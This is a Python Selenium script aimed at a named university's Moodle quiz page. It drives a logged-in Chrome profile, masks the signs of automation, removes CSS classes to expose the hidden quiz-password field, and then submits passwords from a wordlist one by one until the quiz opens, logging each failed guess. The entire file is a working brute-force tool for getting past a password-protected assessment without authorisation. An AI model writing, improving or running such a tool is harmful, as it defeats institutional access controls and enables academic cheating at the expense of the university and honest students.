import logging
import time

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import (
    ElementNotInteractableException,
    TimeoutException,
    WebDriverException
)
import os

url = "https://moodle.bucknell.edu/mod/quiz/view.php?id="
# 1554474
url += input("Paste the id that's at the end of the url (after id=): ")

# Configure logging to WARNING to reduce overhead
logging.basicConfig(level=logging.WARNING, format='%(asctime)s - %(levelname)s - %(message)s')

# Path to your ChromeDriver executable
chromedriver_path = r"C:\WebDrivers\chromedriver.exe"  # Update this path accordingly

# Path to your Chrome User Data (replace with your actual path)
user_data_dir = r"C:\Users\Admin\AppData\Local\Google\Chrome\User Data"
profile_name = "Profile 2"  # Use the appropriate profile

# Configure Chrome options
options = webdriver.ChromeOptions()
options.add_argument(f"--user-data-dir={user_data_dir}")  # Path to Chrome user data
options.add_argument(f"--profile-directory={profile_name}")  # Specify the profile directory
options.add_argument("--no-sandbox")
options.add_argument("--disable-dev-shm-usage")
options.add_argument("--disable-gpu")
# options.add_argument("--headless")  # Run Chrome in headless mode
options.add_argument("--disable-extensions")
options.add_argument("--disable-infobars")
options.add_argument("--window-size=1200x600")  # Set minimal window size
options.add_argument("--disable-extensions")
options.add_experimental_option("useAutomationExtension", False)
options.add_experimental_option("excludeSwitches", ["enable-automation"])

# Disable images to speed up loading
prefs = {"profile.managed_default_content_settings.images": 2}
options.add_experimental_option("prefs", prefs)

# Enable browser logging (optional, useful for debugging)
options.set_capability("goog:loggingPrefs", {"browser": "WARNING"})

# Initialize WebDriver with the specified options
service = Service(chromedriver_path)
try:
    driver = webdriver.Chrome(options=options)
    logging.warning("ChromeDriver initialized successfully.")
except WebDriverException as e:
    logging.error(f"Failed to initialize ChromeDriver: {e}")
    raise


def click_quiz_button():
    """
    Clicks the "Attempt quiz", "Re-attempt quiz", or "Continue your attempt" button based on their presence.
    """
    try:
        # Try locating the "Attempt quiz" button first
        attempt_quiz_button = WebDriverWait(driver, 0.3).until(
            EC.element_to_be_clickable(
                (By.XPATH, '//button[normalize-space(text())="Attempt quiz"]')
            )
        )
        logging.warning("Found 'Attempt quiz' button.")
        driver.execute_script("arguments[0].scrollIntoView(true);", attempt_quiz_button)
        attempt_quiz_button.click()
        logging.warning("Clicked 'Attempt quiz' button.")
    except TimeoutException:
        try:
            # If "Attempt quiz" is not found, try "Re-attempt quiz"
            reattempt_quiz_button = WebDriverWait(driver, 0.3).until(
                EC.element_to_be_clickable(
                    (By.XPATH, '//button[normalize-space(text())="Re-attempt quiz"]')
                )
            )
            logging.warning("Found 'Re-attempt quiz' button.")
            driver.execute_script("arguments[0].scrollIntoView(true);", reattempt_quiz_button)
            reattempt_quiz_button.click()
            logging.warning("Clicked 'Re-attempt quiz' button.")
        except TimeoutException:
            try:
                # If neither "Attempt quiz" nor "Re-attempt quiz" are found, try "Continue your attempt"
                continue_attempt_button = WebDriverWait(driver, 0.3).until(
                    EC.element_to_be_clickable(
                        (By.XPATH, '//button[normalize-space(text())="Continue your attempt"]')
                    )
                )
                logging.warning("Found 'Continue your attempt' button.")
                driver.execute_script("arguments[0].scrollIntoView(true);", continue_attempt_button)
                continue_attempt_button.click()
                logging.warning("Clicked 'Continue your attempt' button.")
            except TimeoutException:
                logging.error(
                    "Neither 'Attempt quiz', 'Re-attempt quiz', nor 'Continue your attempt' buttons were found.")
                raise


# Open the log file in append mode
log_file_path = "tried_passwords.txt"
log_file = open(log_file_path, "a", encoding="utf-8")

try:
    logging.warning(f"Navigating to {url}")
    driver.get(url)

    time.sleep(20)

    # Wait for the page to load completely
    WebDriverWait(driver, 20).until(
        lambda d: d.execute_script('return document.readyState') == 'complete'
    )
    logging.warning("Page has fully loaded.")

    # Click the appropriate quiz button
    click_quiz_button()


    # Optional: Take a screenshot after clicking "Attempt quiz" for debugging (remove to speed up)
    # driver.save_screenshot("after_attempt_quiz.png")
    # logging.warning("Captured screenshot after clicking 'Attempt quiz'.")

    # Function to make the password input visible
    def make_password_input_visible():
        try:
            # Remove 'd-none' class via JavaScript
            driver.execute_script("document.getElementById('id_quizpassword').classList.remove('d-none');")
            logging.warning("Removed 'd-none' class from password input via JavaScript.")
        except Exception as e:
            logging.error(f"Failed to remove 'd-none' class: {e}")
            raise


    # Function to reset the password input field
    def reset_password_input():
        try:
            password_input = driver.find_element(By.ID, "id_quizpassword")
            # Remove 'is-invalid' class if present
            driver.execute_script("arguments[0].classList.remove('is-invalid');", password_input)
            logging.warning("Removed 'is-invalid' class from password input via JavaScript.")
            password_input.clear()
        except Exception as e:
            logging.error(f"Failed to reset password input: {e}")
            raise


    # Wait for the password input field to become visible and interactable
    try:
        logging.warning("Waiting for password input to become visible and interactable.")
        password_input = WebDriverWait(driver, 0.3).until(
            EC.element_to_be_clickable((By.ID, "id_quizpassword"))
        )
        logging.warning("Password input field is now visible and interactable.")
    except TimeoutException:
        logging.error("Password input field did not become interactable after clicking 'Attempt quiz'.")
        # As a workaround, remove 'd-none' via JavaScript
        make_password_input_visible()
        reset_password_input()
        # Re-locate the password input after making it visible
        password_input = driver.find_element(By.ID, "id_quizpassword")
        logging.warning("Password input field is now interactable after removing 'd-none'.")

        # Optional: Take a screenshot after making password input visible (remove to speed up)
        # driver.save_screenshot("after_making_password_visible.png")
        # logging.warning("Captured screenshot after making password input visible.")

    # Locate the "Submit" button
    try:
        submit_button = WebDriverWait(driver, 0.3).until(
            EC.element_to_be_clickable((By.ID, "id_submitbutton"))
        )
        logging.warning("Found 'Submit' button.")
    except TimeoutException:
        logging.error("Could not find the 'Submit' button.")
        raise

    # Load the password list
    password_file = "passwords.txt"
    if not os.path.exists(password_file):
        logging.error(f"The password file '{password_file}' does not exist.")
        raise FileNotFoundError(f"The password file '{password_file}' does not exist.")

    with open(password_file, "r", encoding="utf-8") as f:
        passwords = [line.strip() for line in f if line.strip()]
    logging.warning(f"Loaded {len(passwords)} passwords.")

    # Iterate through each password
    for pwd in passwords:
        logging.warning(f"Trying password: {pwd}")
        try:
            # Record the attempted password


            # Ensure the password input is visible and interactable
            make_password_input_visible()
            reset_password_input()

            # Re-locate the password input field
            password_input = WebDriverWait(driver, 0.3).until(
                EC.element_to_be_clickable((By.ID, "id_quizpassword"))
            )

            # Enter the password
            password_input.send_keys(pwd)
            logging.warning(f"Entered password: {pwd}")

            # Click the "Submit" button
            submit_button = WebDriverWait(driver, 0.3).until(
                EC.element_to_be_clickable((By.ID, "id_submitbutton"))
            )
            submit_button.click()
            logging.warning("Clicked 'Submit' button.")

            # Optional: Take a screenshot after submitting (remove to speed up)
            # driver.save_screenshot(f"after_submit_{pwd}.png")
            # logging.warning(f"Captured screenshot after submitting password: {pwd}.")

            # Wait for a specific element that indicates success
            # Replace '.quiz-content' with an actual selector present only on success
            try:
                WebDriverWait(driver, 0.3).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, ".quiz-content"))  # Update selector as needed
                )
                logging.warning(f"Success! The correct password is: {pwd}")
                break  # Exit the loop upon success
            except TimeoutException:
                log_file.write(pwd + "\n")
                log_file.flush()  # Ensure it's written immediately
                logging.warning(f"Password '{pwd}' failed. Trying next...")
                # Continue to the next password without re-clicking any buttons
                continue  # Proceed to the next password

        except ElementNotInteractableException as e:
            logging.error(f"Element not interactable for password '{pwd}': {e}")
            # Attempt to make the input visible and reset again
            make_password_input_visible()
            reset_password_input()
            continue  # Proceed to the next password

        except Exception as e:
            logging.error(f"An unexpected error occurred while trying password '{pwd}': {e}")
            # Optionally, handle other exceptions
            continue  # Proceed to the next password

    else:
        logging.warning("All passwords have been tried and none succeeded.")

except Exception as main_e:
    logging.error(f"An error occurred in the main execution: {main_e}")
    raise

finally:
    # Close the log file
    log_file.close()

    # Close the browser
    driver.quit()
    logging.warning("Browser closed.")
